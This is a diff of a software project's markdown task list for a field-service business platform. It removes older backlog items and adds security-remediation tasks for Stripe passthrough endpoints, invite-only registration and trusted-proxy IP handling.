-  - **What**: Review 203+ hook instances for necessity
-  - **Why**: May be over-optimizing; adds complexity
-  - **Expected Result**: Hooks used only where needed
-  - **Acceptance Criteria**:
-    - Document when to use memoization
-    - Remove unnecessary memoization
-    - No performance regression
-    - Guidelines in CONTRIBUTING.md
-
-- [ ] **Review Barrel Export Files**
-  - **What**: Audit 1978 lines of index.ts exports for unused exports
-  - **Why**: May have orphaned exports; adds to bundle
-  - **Expected Result**: Clean exports with no dead code
-  - **Acceptance Criteria**:
-    - Remove unused exports
-    - Add lint rule for unused exports
-    - Document export patterns
-
-### Frontend Refactoring (Code Deduplication)
-
-- [x] **T021: Extract Duplicate File Download Utility** ✓ COMPLETE
-  - **What**: Create `src/utils/fileDownload.ts` utility
-  - **Why**: Same download pattern copy-pasted in 7+ locations
-  - **Files with Duplicate Code**:
-    - `services/exportService.ts`
-    - `services/revenueService.ts`
-    - `services/customerReportService.ts`
-    - `services/invoiceService.ts`
-    - `services/templateService.ts`
-    - `components/quotes/utils/pdfGenerator.tsx`
-    - `hooks/useRoles.ts`
-  - **Implementation**:
-
-    ```typescript
-    // src/utils/fileDownload.ts
-    export function downloadFile(blob: Blob, filename: string): void {
-      const url = window.URL.createObjectURL(blob);
-      const link = document.createElement('a');
-      link.href = url;
-      link.setAttribute('download', filename);
-      document.body.appendChild(link);
-      link.click();
-      link.remove();
-      window.URL.revokeObjectURL(url);
-    }
-
-    export function downloadFromResponse(
-      response: Response,
-      filename: string
-    ): Promise<void>;
-    export function downloadCSV(data: string, filename: string): void;
-    export function downloadJSON(data: object, filename: string): void;
-    ```
-
-  - **Estimated Savings**: ~100 lines of duplicate code
-
-- [x] **T022: Extract Duplicate URLSearchParams Builder** ✓
-  - **What**: Created `src/utils/queryParams.ts` utility
-  - **Status**: COMPLETE
-  - **Implementation**:
-    - Created `src/utils/queryParams.ts` with `buildQueryParams()`, `buildQueryString()`, and `appendQueryParams()` functions
-    - Refactored `customerReportService.ts` (7 instances)
-    - Refactored `revenueService.ts` (6 instances)
-    - Refactored `invoiceService.ts` (1 instance)
-    - Refactored `customerService.ts` (1 instance)
-  - **Estimated Savings**: ~80 lines of duplicate code
-
-- [x] **T023: Consolidate Cache Hooks** ✓
-  - **What**: Combined `useLocalCache` and `useSessionCache` into generic `useStorageCache` hook
-  - **Status**: COMPLETE
-  - **File**: `src/hooks/useCache.ts`
-  - **Implementation**:
-    - Created `CacheAdapter` interface for type-safe cache operations
-    - Created generic `useStorageCache` hook that works with any adapter
-    - `useLocalCache` wraps `cache` module with subscription support
-    - `useSessionCache` wraps `sessionCache` module
-    - Both hooks now share the same core logic
-  - **Estimated Savings**: ~50 lines of duplicate code
-
-### Analytics & Observability
-
-- [x] **T025: Integrate Product Analytics (PostHog Recommended)** ✓ COMPLETE
-  - PostHog integrated for both frontend (posthog-js) and backend (posthog-go)
-  - Frontend: analytics service with initAnalytics, trackEvent, identifyUser, resetUser
-  - Type-safe event constants (AnalyticsEvents) for all tracked events
-  - Page view tracking via PageViewTracker component in App.tsx
-  - User identity set on login/checkAuth, cleared on logout
-  - Key workflow events: quote_created/sent/accepted/rejected, job_created/completed/status_changed, invoice_created/sent, export_downloaded
-  - Backend: pluggable analytics client (factory pattern, mirrors errortracking package)
-  - PostHog and mock providers; no API key = mock/no-op
-  - Server-side: Stripe checkout webhook → payment_received event
-  - useAnalytics hook for React components
-  - Env vars: POSTHOG_API_KEY, POSTHOG_HOST (backend), VITE_POSTHOG_API_KEY, VITE_POSTHOG_HOST (frontend)
-
-- [x] **T026: Set Up Business KPI Dashboard (Grafana)** ✓ COMPLETE
-  - Replaced Metabase with Grafana OSS in docker-compose.yml (port 3001)
-  - Auto-provisioned PostgreSQL data source via `grafana/provisioning/datasources/postgres.yml`
-  - Pre-built dashboard auto-loaded via `grafana/dashboards/platform-overview.json`
-  - No setup wizard needed — login with admin/admin, dashboard is ready
-  - Created 8 PostgreSQL views in `001_schema.sql` for KPI aggregation:
-    - `v_platform_overview` — snapshot counts (tenants, users, jobs, quotes, invoices)
-    - `v_tenant_growth_daily` — new tenants per day with cumulative total
-    - `v_feature_adoption` — per-tenant usage of jobs, quotes, invoices, payments
-    - `v_job_metrics_daily` — daily job creation/completion by status
-    - `v_invoice_metrics_daily` — daily invoice volume and amounts
-    - `v_quote_conversion` — per-tenant quote conversion rates
-    - `v_revenue_daily` — daily payment totals
-    - `v_ar_aging_summary` — outstanding invoices by age bucket
-  - Dashboard has 12 panels: 5 stat counters, 4 time-series, 1 table, 1 bar gauge, 1 bar chart
-  - Grafana Cloud free tier (3 users, 10k metrics) available for production deployment
-
-- [ ] **T027: Add Drag-and-Drop Rescheduling to Job Calendar**
-  - **What**: Enable drag-and-drop to reschedule jobs on the calendar view
-  - **Why**: Allow quick rescheduling without navigating to job detail page
-  - **Depends On**: T020 (Conflict Detection API) - should validate conflicts before saving
-  - **Current State**: Calendar view (T019) is implemented as read-only; drag-drop code is commented out
-  - **Implementation**:
-    - Re-enable `onEventDrop` and `onEventResize` handlers in `Calendar.tsx`
-    - Integrate `ConflictChecker` component before confirming reschedule
-    - Call `jobService.updateJob()` with new `scheduled_start_at`/`scheduled_end_at`
-    - Show success/error toast notifications
-  - **Files to Modify**:
-    - `frontend/src/components/calendar/Calendar.tsx` - Uncomment drag-drop handlers
-    - `frontend/src/pages/Jobs/JobCalendarPage.tsx` - Add drop/resize handlers
-  - **Acceptance Criteria**:
-    - Drag event to new time slot updates job schedule
-    - Resize event adjusts job duration
-    - Conflict warnings shown before saving (requires T020)
-    - Undo option or confirmation dialog before save
-    - Loading state during save operation
-
-- [x] **T018: Dead Code Elimination** ✓ COMPLETE
-  - **What**: Remove unused components, hooks, and utilities identified in audit
-  - **Why**: ~2,700 lines of dead code identified
-  - **Already Deleted (2026-02-02)**:
-    - [x] `src/components/recurring/` - Unused recurring job components
-    - [x] `src/components/subscriptions/` - Unused billing/subscription components
-    - [x] `src/components/health/` - DevOps tool, no backend, use Prometheus/Grafana instead
-    - [x] `src/utils/performance.ts` - Use Sentry Performance or Vercel Analytics instead
-    - [x] `src/hooks/useErrorTracking.ts` - Will rebuild with proper Sentry integration (T024)
-    - [x] `src/hooks/useAnalytics.ts` - Use PostHog instead (T025)
-    - [x] `src/hooks/useKPI.ts` - Use Grafana instead (T026)
-  - **Remaining to Delete**: None - all dead code cleaned up!
-  - **Components to Keep** (valuable, need integration):
-    - `src/components/calendar/` - See T019
-    - `src/components/scheduling/` - See T020
-  - **Dead Code Detection Added (2026-02-05)**:
-    - [x] ts-prune installed and configured
-    - [x] `npm run dead-code` script checks for new dead code
-    - [x] `npm run dead-code:update` updates baseline
-    - [x] Pre-commit hook added
-    - [x] CI job added to checks.yml
-    - [x] Baseline established with 116 known unused exports
-  - **Acceptance Criteria**:
-    - [x] All dead code removed
-    - [x] No TypeScript errors after removal
-    - [x] Bundle size reduced
-    - [x] Automated detection prevents new dead code
-
-- [ ] **Complete Footer Links**
-  - **What**: Create pages and routes for all footer links currently pointing to "/"
-  - **Why**: Footer links (Features, Pricing, About, Contact, Privacy Policy, Terms of Service) are placeholders leading to homepage
-  - **Expected Result**: All footer links navigate to proper pages with appropriate content
-  - **Acceptance Criteria**:
-    - Features page created with product feature highlights
-    - Pricing page linked correctly (may already exist)
-    - About page created with company information
-    - Contact page created with contact form/information
-    - Privacy Policy page created with legal content
-    - Terms of Service page created with legal content
-    - All links in Footer.tsx updated to correct routes
-    - SEO meta tags added to each page
-
-### Backend Cleanup
-
-- [ ] **Standardize API Error Responses**
-  - **What**: Create consistent error response format across all endpoints
-  - **Why**: Inconsistent error formats make client handling difficult
-  - **Expected Result**: All errors follow same structure
-  - **Acceptance Criteria**:
-    - Standard format: `{error: string, message: string, details?: object}`
-    - HTTP status codes used correctly
-    - Validation errors include field-level details
-    - Internal errors don't leak implementation details
-
-- [ ] **Resolve Payment Tracking TODOs**
-  - **What**: Implement 7 TODOs in payment tracking model
-  - **Why**: Incomplete payment tracking features
-  - **Expected Result**: Full payment tracking functionality
-  - **Acceptance Criteria**:
-    - All TODOs resolved or converted to issues
-    - Payment tracking working end-to-end
-    - Tests added for new functionality
-
-### Performance
-
-- [x] **T016: Frontend Bundle Analysis + Optimization** ✓ COMPLETE
-  - Reduced total gzipped bundle from 720KB to 322KB (-55%)
-  - Lazy-loaded `@react-pdf/renderer` via dynamic `import()` — removed barrel re-exports that created static dependency chain
-  - Fixed chunk splitting: `react-big-calendar` was landing in catch-all vendor due to `react` prefix match — added exact boundary matching in `manualChunks`
-  - Created dedicated chunks: `vendor-calendar` (react-big-calendar + deps), `vendor-pdf` (@react-pdf + 17 transitive deps), `vendor-table` (@tanstack/react-table)
-  - Fixed `analyze-bundle.cjs` (renamed from .js to resolve CommonJS/ESM conflict)
-  - Updated performance budgets in `optimization.ts`
-  - Key files: `frontend/config/optimization.ts`, `frontend/src/components/quotes/QuoteDetail.tsx`, `frontend/src/components/quotes/index.ts`
-
-- [ ] **Redis Caching for Frequent Queries**
-  - **What**: Add caching for frequently accessed data
-  - **Why**: Reduce database load for common queries
-  - **Expected Result**: Faster response times for cached data
-  - **Queries to cache**:
-    - Customer counts per tenant
-    - Job statistics (pending, completed)
-    - User permissions
-  - **Acceptance Criteria**:
-    - Cache TTL configurable (default: 5 minutes)
-    - Cache invalidation on data changes
-    - Cache hit/miss metrics
-
-### Security
-
-- [ ] **Document Secrets Rotation Strategy**
-  - **What**: Create runbook for rotating all secrets
-  - **Why**: No documented procedure for secret rotation
-  - **Expected Result**: Clear procedure for rotating each secret
-  - **Secrets to document**:
-    - Database credentials
-    - JWT signing key
-    - Stripe API keys
-    - AWS credentials
-    - Redis password
-  - **Acceptance Criteria**:
-    - Runbook in docs/security/
-    - Zero-downtime rotation procedure
-    - Tested in staging
-
-### CRM - Medium Priority
-
-- [x] **T053: Add "Repeat Job" Button on Customer Detail** ✓ COMPLETE
-  - **What**: Button to create new job from last job for a customer
-  - **Why**: Service businesses do recurring work (annual maintenance, quarterly pest control)
-  - **Confidence**: High - straightforward clone operation
-  - **Context**: Customer calls, wants same service as last time → one click → job created with same details
-  - **Acceptance Criteria**:
-    - ~~Button on customer detail page~~ ✓
-    - ~~Creates job with same service type, notes, duration~~ ✓
-    - ~~Opens job for scheduling~~ ✓
-
-- [ ] **T054: Create Communication Log Component**
-  - **What**: Unified view of all communications with a customer
-  - **Why**: "Did anyone call Mrs. Smith?" - shows all emails, SMS, calls in one place
-  - **Confidence**: Medium - unclear if needs threaded view or simple list
-  - **Acceptance Criteria**:
-    - Shows emails, SMS, calls
-    - Chronological order
-    - Links to related records
-
-- [ ] **T055: Unified Customer Timeline View**
-  - **What**: Single scrollable timeline: jobs, quotes, invoices, payments, communications
-  - **Why**: "At a glance" customer history for context in conversations
-  - **Confidence**: Medium - complexity depends on richness of interaction
-  - **Acceptance Criteria**:
-    - All customer activity in one timeline
-    - Clickable items link to detail pages
-    - Filterable by type
-
-### Scheduling - Medium Priority
-
-- [ ] **T056: Add Workload Capacity Warnings**
-  - **What**: Warning when technician exceeds daily capacity
-  - **Why**: Prevents overloading techs
-  - **Confidence**: Medium - threshold logic unclear (8 hours? configurable?)
-  - **Context**: "John already has 8 hours scheduled today" when adding more
-  - **Acceptance Criteria**:
-    - Warning shown when over threshold
-    - Configurable threshold
-    - Can override with acknowledgment
-
-- [ ] **T057: Add Double-booking Override with Reason**
-  - **What**: Allow scheduling conflicts with mandatory reason
-  - **Why**: Sometimes you NEED two techs on same job, or emergency overrides
-  - **Confidence**: High - simple modal with text field
-  - **Acceptance Criteria**:
-    - Override option when conflict detected
-    - Reason field required
-    - Override logged for audit
-
-- [ ] **T058: Add Required Fields Validation by Job Stage**
-  - **What**: Enforce required data at each job status transition
-  - **Why**: Techs can't mark "complete" without notes/photos
-  - **Confidence**: Medium - exact requirements per stage unclear
-  - **Context**: Completion requires notes, photos, time logged. Prevents rushing without documentation.
-  - **Acceptance Criteria**:
-    - Configurable required fields per status
-    - Validation on status change
-    - Clear error messages
-
-- [ ] **T059: Add Technician Skill Tags**
-  - **What**: Tag techs with skills (HVAC, plumbing, electrical)
-  - **Why**: Used for smart assignment suggestions
-  - **Confidence**: High - simple tagging system
-  - **Acceptance Criteria**:
-    - Can add/remove skill tags
-    - Skills visible on tech profile
-    - Filter techs by skill
-
-### Quoting - Medium Priority
-
-- [ ] **T060: Create Quote Template System (Good/Better/Best)**
-  - **What**: Pre-built quote templates with tiered options
-  - **Why**: Upsell pattern - "Basic AC Tune-up $149, Premium $249, Complete $399"
-  - **Confidence**: Medium - complexity in template builder UI
-  - **Acceptance Criteria**:
-    - Create/edit templates
-    - Templates have line items
-    - One-click apply template to quote
-
-- [ ] **T061: Add Required Deposit to Accept Quote**
-  - **What**: Option to require payment before quote acceptance
-  - **Why**: Common for big jobs - "Pay $200 deposit to confirm"
-  - **Confidence**: Medium - integrates with Stripe checkout
-  - **Acceptance Criteria**:
-    - Configurable deposit amount/percentage
-    - Quote acceptance triggers payment
-    - Deposit tracked separately
-
-- [ ] **T062: Add Quote Aging Tracking**
-  - **What**: Track how long quotes have been pending
-  - **Why**: Helps prioritize follow-ups
-  - **Confidence**: High - simple date math
-  - **Acceptance Criteria**:
-    - Age displayed on quote list
-    - Sortable by age
-    - Filter by age range
-
-### Invoicing - Medium Priority
-
-- [ ] **T063: Add Deposit Tracking and Application**
-  - **What**: Track deposits separately, apply to final invoice
-  - **Why**: Proper accounting for deposits
-  - **Confidence**: Medium - accounting complexity
-  - **Context**: Customer paid $500 deposit → Final invoice shows $2000 total, $500 deposit, $1500 due
-  - **Acceptance Criteria**:
-    - Deposits tracked separately
-    - Applied to invoice automatically
-    - Clear in invoice display
-
-- [ ] **T064: Add Last Contact Date Tracking on Invoices**
-  - **What**: Track when customer was last contacted about invoice
-  - **Why**: Prevents pestering, ensures follow-up
-  - **Confidence**: High - simple date field
-  - **Acceptance Criteria**:
-    - Date updated on contact
-    - Visible in collections view
-    - Filter by last contact
-
-- [ ] **T065: Add Promise-to-Pay Notes**
-  - **What**: Field to track customer payment commitments
-  - **Why**: Customer says "I'll pay Friday" - log it
-  - **Confidence**: High - simple notes field with date
-  - **Acceptance Criteria**:
-    - Promise date and amount
-    - Visible in collections
-    - Alert when promise date passes
-
-### Dashboard - Medium Priority
-
-- [ ] **T066: Add Technician Utilization Widget**
-  - **What**: Show scheduled hours per tech today
-  - **Why**: Helps with capacity planning
-  - **Confidence**: Medium - unclear if needs historical trend
-  - **Context**: "John: 6/8 hours (75%), Sarah: 8/8 hours (100%)"
-  - **Acceptance Criteria**:
-    - Shows utilization per tech
-    - Today's view
-    - Highlights underutilized/overutilized
-
-- [ ] **T067: Add Quote Conversion Rate Metric**
-  - **What**: Display quote-to-job conversion rate on dashboard
-  - **Why**: Business health indicator
-  - **Confidence**: High - simple math: accepted / total
-  - **Acceptance Criteria**:
-    - Shows percentage
-    - Configurable time period
-    - Trend indicator
-
-### Reporting - Medium Priority
-
-- [ ] **T068: Build Job-completion-to-invoice Time Report**
-  - **What**: Average days from job done to invoice sent
-  - **Why**: Measures billing efficiency
-  - **Confidence**: High - timestamps exist
-  - **Acceptance Criteria**:
-    - Average days displayed
-    - Trend over time
-    - Filter by period
-
-- [ ] **T069: Build Invoice-to-paid Time Report (DSO)**
-  - **What**: Days Sales Outstanding - average days to collect payment
-  - **Why**: Key financial metric
-  - **Confidence**: High - standard calculation
-  - **Acceptance Criteria**:
-    - DSO calculated
-    - Trend over time
-    - Industry comparison
-
-- [ ] **T070: Build Revenue by Service Type Report**
-  - **What**: Revenue breakdown by job type
-  - **Why**: Shows where money comes from
-  - **Confidence**: High - straightforward aggregation
-  - **Acceptance Criteria**:
-    - Revenue per service type
-    - Chart visualization
-    - Filter by period
-
-- [ ] **T071: Build Collections Rate Report**
-  - **What**: Percentage of billed revenue collected
-  - **Why**: Tracks bad debt
-  - **Confidence**: High - simple ratio
-  - **Acceptance Criteria**:
-    - Collection rate percentage
-    - Trend over time
-    - Breakdown by age
-
-### Communications - Medium Priority
-
-- [ ] **T072: Create Message Template Management UI**
-  - **What**: CRUD for email/SMS templates per company
-  - **Why**: Customizable communications
-  - **Confidence**: High - standard template management
-  - **Acceptance Criteria**:
-    - Create/edit/delete templates
-    - Template categories
-    - Preview before save
-
-- [ ] **T073: Add Rich Variable System for Templates**
-  - **What**: Variable substitution in templates
-  - **Why**: Personalized messages
-  - **Confidence**: High - standard pattern
-  - **Context**: `{{customer_first_name}}`, `{{job_date}}`, `{{tech_name}}`
-  - **Acceptance Criteria**:
-    - Documented variables
-    - Preview with sample data
-    - Error if variable missing
-
-### Roles - Medium Priority
-
-- [ ] **T074: Create Accountant Role**
-  - **What**: View-only access to all financial data
-  - **Why**: For bookkeeper/CPA access
-  - **Confidence**: High - clear permission boundaries
-  - **Permissions to include**:
-    - View all invoices
-    - View all payments
-    - View financial reports
-    - Export data
-  - **Permissions to exclude**:
-    - Create/edit customers
-    - Modify jobs
-    - Change settings
-  - **Acceptance Criteria**:
-    - Role created
-    - All financial data visible
-    - No modification allowed
-
-- [ ] **T075: Add Field-level Permission Controls**
-  - **What**: Hide specific fields based on role
-  - **Why**: Tech can't see "customer owes $5,000 overdue"
-  - **Confidence**: Medium - more complex than page-level permissions
-  - **Acceptance Criteria**:
-    - Financial fields hidden from non-financial roles
-    - Configurable field visibility
-    - No data leakage
+**Notes** — security audit F-2, F-25 (`jwt_tenant_id`). The frontend half of the stale-tenant-header problem is T132. T035/T052/T074 (new roles) depend on this being correct.
 
 ---
 
-## P3 - Low Priority (Nice to Have)
+#### T105 — Remove or lock the raw Stripe passthrough endpoints
 
-### Infrastructure
+**Phase**: 1 · **Category**: Security · **Hours**: 3 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-- [ ] **Advanced Observability Setup**
-  - **What**: Complete Loki/BetterStack integration for log aggregation
-  - **Why**: Clients exist but may not be fully configured
-  - **Expected Result**: Centralized log aggregation with search
-  - **Acceptance Criteria**:
-    - Logs shipped to aggregation service
-    - Log retention configured
-    - Search and alerting enabled
+**What it is** — The generic Stripe endpoints that act on any Stripe object ID from the request body are removed from the router; any operation that must stay looks the object up by `(tenant_id, local_id)` in our DB.
 
-### Email
+**What it does** — Unmount the routes in `stripe_routes.go:40-89`: `CreateRefund` (`stripe_handler.go:341-370`) passes any `charge_id`/`payment_intent_id` to Stripe; `GetPaymentIntent`, `Confirm`, `Cancel`, `Capture` take any PaymentIntent ID; `GetCustomer` (`:303`) takes any Stripe customer ID. Keep only what the invoice checkout and subscription billing flows actually call, each resolved from a locally stored, tenant-owned record. Also drop the `float64` amount input at `stripe_handler.go:63`.
 
-- [ ] **Email Analytics (Open/Click Tracking)**
-  - **What**: Track email opens and link clicks
-  - **Why**: Measure email engagement for marketing
-  - **Expected Result**: Analytics for email campaigns
-  - **Acceptance Criteria**:
-    - Tracking pixel injection for opens
-    - Link wrapping for click tracking
-    - Opt-out management
-    - Analytics dashboard
+**Why we need it** — Combined with F-1/F-2 any user holds `payments.refund`, so they can refund any payment collected through the platform account or read other tenants' Stripe customers.
 
-### Frontend
-
-- [ ] **Standardize Component Patterns**
-  - **What**: Create consistent patterns across all pages
-  - **Why**: Different pages use different patterns
-  - **Expected Result**: Consistent, maintainable components
-  - **Acceptance Criteria**:
-    - Component template documented
-    - Example component provided
-    - Existing components refactored gradually
-
-### Backend
-
-- [ ] **Implement GeoIP Lookup**
-  - **What**: Complete GeoIP stub in access control
-  - **Why**: Currently placeholder; needed for location-based features
-  - **Expected Result**: IP addresses resolved to locations
-  - **Acceptance Criteria**:
-    - MaxMind or similar integrated
-    - Database auto-updated
-    - Location available in request context
-
-- [ ] **Customer Email Validation**
-  - **What**: Complete TODO for customer email validation
-  - **Why**: Customer emails not validated
-  - **Expected Result**: Invalid emails rejected at creation
-  - **Acceptance Criteria**:
-    - Email format validation
-    - Optional MX record check
-    - Disposable email detection (optional)
-
-### Testing
-
-- [ ] **Target 80% Backend Test Coverage**
-  - **What**: Increase test coverage to 80%+
-  - **Why**: Long-term code quality goal
-  - **Expected Result**: Comprehensive test suite
-  - **Acceptance Criteria**:
-    - Coverage reported in CI
-    - Coverage gate at 80%
-    - Critical paths at 90%+
-
-### Performance
-
-- [ ] **Image Optimization Strategy**
-  - **What**: Implement image optimization for user uploads
-  - **Why**: Large images slow down pages
-  - **Expected Result**: Images automatically optimized
-  - **Acceptance Criteria**:
-    - Images resized on upload
-    - WebP format generated
-    - CDN integration
-    - Lazy loading implemented
-
-### CRM - Low Priority
-
-- [ ] **T076: Add "Recreate Last Quote" Button**
-  - **What**: One-click to clone customer's most recent quote
-  - **Why**: Customer calls back months later wanting same work
-  - **Confidence**: High - simple clone operation
-
-### Scheduling - Low Priority
-
-- [ ] **T077: Add Time-off Request UI**
-  - **What**: Techs request time off, managers approve
-  - **Why**: Vacation/sick day management
-  - **Confidence**: Medium - could be simple block or complex approval workflow
-
-- [ ] **T078: Add Skill-based Job Matching Suggestions**
-  - **What**: Suggest techs based on job type vs tech skills
-  - **Why**: Smart assignment recommendations
-  - **Confidence**: Medium - filtering logic complexity
-
-- [ ] **T079: Add Travel Time Notes Field**
-  - **What**: Field to note expected travel time between jobs
-  - **Why**: Helps with scheduling accuracy
-  - **Confidence**: High - simple text/number field
-
-### Quoting - Low Priority
-
-- [ ] **T080: Create Terms & Conditions Templates**
-  - **What**: Reusable legal text blocks for quotes
-  - **Why**: Consistent terms across quotes
-  - **Confidence**: High - simple template CRUD
-
-- [ ] **T081: Add E-signature for Quote Acceptance**
-  - **What**: Customer signs digitally to accept quote
-  - **Why**: Legal acceptance record
-  - **Confidence**: Medium - could be typed name or signature pad
-
-- [ ] **T082: Add "Create Quote from Job" Button**
-  - **What**: Generate quote from completed job
-  - **Why**: Customer asks "how much to replace the whole unit?"
-  - **Confidence**: Medium - less common workflow
-
-### Invoicing - Low Priority
-
-- [ ] **T083: Implement Late Fee Calculation**
-  - **What**: Auto-calculate late fees based on rules
-  - **Why**: Enforce payment terms
-  - **Confidence**: Medium - rules vary by business/jurisdiction
-
-### Reporting - Low Priority
-
-- [ ] **T084: Build Quote-to-job Conversion Report**
-  - **What**: Detailed conversion analysis over time
-  - **Why**: Track sales effectiveness
-  - **Confidence**: High - extends dashboard metric
-
-- [ ] **T085: Build Lead-to-quote Time Report**
-  - **What**: Average time from new customer to first quote
-  - **Why**: Measures sales speed
-  - **Confidence**: Medium - requires tracking customer creation date
-
-- [ ] **T086: Build Quote-to-acceptance Time Report**
-  - **What**: Average time for quotes to be accepted
-  - **Why**: Measures quote effectiveness
-  - **Confidence**: High - timestamps exist
-
-- [ ] **T087: Build Revenue by Technician Report**
-  - **What**: Revenue attributed to each tech
-  - **Why**: Performance tracking
-  - **Confidence**: Medium - privacy considerations
-
-- [ ] **T088: Add Comparative Analysis (vs Prior Period)**
-  - **What**: "Revenue this month vs last month: +12%"
-  - **Why**: Trend visibility
-  - **Confidence**: Medium - period comparison logic
-
-### Communications - Low Priority
-
-- [ ] **T089: Add Email/SMS Delivery Tracking**
-  - **What**: Track sent/delivered/failed status
-  - **Why**: Know if messages reached customers
-  - **Confidence**: Medium - provider webhook integration
-
-- [ ] **T090: Add Communication Failure Alerts**
-  - **What**: Alert admin when communications fail
-  - **Why**: Prevent silent failures
-  - **Confidence**: Medium - alerting infrastructure needed
-
-- [ ] **T091: Add Notification Preferences per Customer**
-  - **What**: Customer opts out of certain notifications
-  - **Why**: Respect preferences, compliance
-  - **Confidence**: Medium - preference storage and checking
-
-### Roles & Security - Low Priority
-
-- [ ] **T092: Implement 2FA (TOTP)**
-  - **What**: Google Authenticator compatible 2FA
-  - **Why**: Security enhancement
-  - **Confidence**: High - standard implementation
-
-- [ ] **T093: Implement Comprehensive Audit Logging**
-  - **What**: Track all data changes with who/what/when
-  - **Why**: Compliance and debugging
-  - **Confidence**: Medium - complex to implement well
-
-- [ ] **T094: Add Google OAuth Sign-in**
-  - **What**: "Sign in with Google" option
-  - **Why**: Convenience
-  - **Confidence**: High - standard OAuth flow
-
-### Integration - Low Priority
-
-- [ ] **T095: Build Outgoing Webhooks System**
-  - **What**: Send events to customer-configured URLs
-  - **Why**: Integration with external systems
-  - **Confidence**: Medium - webhook infrastructure
-
-- [ ] **T096: Build Event Log Table**
-  - **What**: Store all significant events
-  - **Why**: Debugging and integration foundation
-  - **Confidence**: High - straightforward logging
-
-- [ ] **T097: Add Webhook Retry Logic**
-  - **What**: Retry failed webhook deliveries
-  - **Why**: Reliable event delivery
-  - **Confidence**: High - standard retry pattern
-
-- [ ] **T098: Document Public API (OpenAPI/Swagger)**
-  - **What**: API documentation for integrations
-  - **Why**: Enable third-party integrations
-  - **Confidence**: High - documentation generation
-
-- [ ] **T101: Upload Source Maps to Sentry for Production Builds**
-  - **What**: Configure frontend build to upload source maps to Sentry/GlitchTip during production deployments
-  - **Why**: Stack traces in error reports currently show minified code; source maps enable readable traces with original file/line references
-  - **Tasks**:
-    - [ ] Add `@sentry/vite-plugin` to Vite build config
-    - [ ] Configure auth token and project settings in CI environment
-    - [ ] Upload source maps during `deploy-release.yml` workflow
-    - [ ] Verify source maps are served correctly in GlitchTip dashboard
-  - **Confidence**: High - standard Sentry plugin integration
+**Notes** — security audit F-4; correctness audit 7.L3 (float amount). Long-term the money path moves to Stripe Connect (T169), where each tenant's objects live on their own connected account.
 
 ---
 
-## Email Client Enhancements
+#### T106 — Backend-enforced invite-only registration; reject non-edge traffic in production
 
-The following advanced email features were identified in legacy code and should be integrated into the unified email client factory (`pkg/clients/email/`). These features should be implemented for all email providers (SES, Resend, Mock).
+**Phase**: 1 · **Category**: Security · **Hours**: 5 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T107
 
-### Rate Limiting & Throttling
+**What it is** — `POST /auth/register` only succeeds with a valid pending invitation whose email matches, and in production the API refuses requests that did not come through the Cloudflare edge Worker.
 
-- [ ] **Token Bucket Rate Limiter** - Prevent exceeding provider send limits
-  - Configurable tokens per second (e.g., SES sandbox = 14/sec)
-  - Automatic token refill based on elapsed time
-  - Context-aware waiting (respects cancellation)
-  - **Benefit**: Prevents API throttling errors and account suspension
+**What it does** — Add `REGISTRATION_MODE` (`open` | `invite_only`, default `invite_only` outside development) to `config/config.go`, `backend/.env.example` and `backend/.env` per CLAUDE.md. `registration_service.go:40-104` requires a matching invitation token when invite-only. First tenant owners (who have no tenant to be invited to) get a platform-issued signup invite created by a super_admin (CLI or admin endpoint); T205 seeds the first ones. In `ENV=production`, a middleware rejects any request whose `X-SP-Edge-Secret` does not equal `EDGE_PROXY_SECRET` (same secret the T107 middleware reads; Cloud Run ingress cannot be restricted to Workers egress, so the shared secret is the control), except `/health/live` for platform probes.
 
-### Retry Logic with Exponential Backoff
+**Why we need it** — The preview is meant to be invite-only, but `auth_routes.go:16` registers `POST /auth/register` publicly. Anyone who finds the API (the repo is public, and so is the `*.run.app` URL) can create an account and chain F-1/F-2/F-3.
 
-- [ ] **Smart Retry System** - Handle transient failures gracefully
-  - Configurable max retries, base delay, max delay, multiplier
-  - Jitter to prevent thundering herd
-  - Distinguish retryable vs non-retryable errors
-  - **Benefit**: Improved delivery reliability without manual intervention
-
-### Batch Sending
-
-- [ ] **Concurrent Batch Operations** - Send multiple emails efficiently
-  - Configurable concurrency limit (semaphore-based)
-  - Aggregate results with success/failure counts
-  - Context cancellation support
-  - **Benefit**: Efficient bulk email operations (newsletters, notifications)
-
-### Email Queue System
-
-- [ ] **Redis-Backed Email Queue** - Async email processing with persistence
-  - Job priorities (low, normal, high, critical)
-  - Job statuses (pending, processing, completed, failed, retrying, dead)
-  - Scheduled sends (future dated emails)
-  - Dead letter queue for failed emails
-  - Worker pool with configurable concurrency
-  - **Benefit**: Decouples email sending from request handling, improves reliability
-
-### Email Tracking & Analytics
-
-- [ ] **Open/Click Tracking** - Monitor email engagement
-  - Tracking pixel injection for opens
-  - Link wrapping for click tracking
-  - Opt-out management
-  - **Benefit**: Measure email campaign effectiveness
-
-- [ ] **Analytics Dashboard** - Aggregate email metrics
-  - Send/delivery/bounce/complaint rates
-  - Time-series data with configurable aggregation
-  - Caching for performance
-  - **Benefit**: Business insights into email performance
-
-### Template Support
-
-- [ ] **SES Template Integration** - Use pre-defined templates
-  - Template prefix configuration
-  - Dynamic template data injection
-  - Template versioning support
-  - **Benefit**: Consistent branding, easier template management
-
-### CloudWatch Metrics Integration
-
-- [ ] **Email Metrics to CloudWatch** - Operational visibility
-  - Send success/failure counts
-  - Latency histograms
-  - Custom dimensions (environment, email type)
-  - **Benefit**: Alerting and dashboards for email health
-
-### Domain Verification
-
-- [ ] **SES Domain Management** - Programmatic domain setup
-  - Domain verification status checking
-  - DKIM setup and verification
-  - MAIL FROM domain configuration
-  - **Benefit**: Automated email infrastructure setup
+**Notes** — security audit F-6. Cloudflare Access in front of the whole host is an optional extra for the preview. When auth moves to Supabase (T158) the invite check moves to first-provision of the `users` row.
 
 ---
 
-## Storage Client Enhancements
+#### T107 — Edge client-IP middleware and a safe trusted-proxy default
 
-The following advanced storage features were identified in legacy code and should be integrated into the unified storage client factory (`pkg/clients/storage/`). These features should be implemented for all storage providers (S3, R2, Mock).
+**Phase**: 1 · **Category**: Security · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-### Multipart Upload/Download Management
+**What it is** — The API derives the client IP from a header the edge Worker sets, trusted only when the shared edge secret matches; otherwise Gin trusts no proxy.
 
-- [ ] **AWS S3 Manager Integration** - Efficient large file handling
-  - Configurable part size and concurrency
-  - Automatic multipart uploads for large files
-  - Parallel download with byte ranges
-  - **Benefit**: Faster uploads/downloads for large files, automatic retry of failed parts
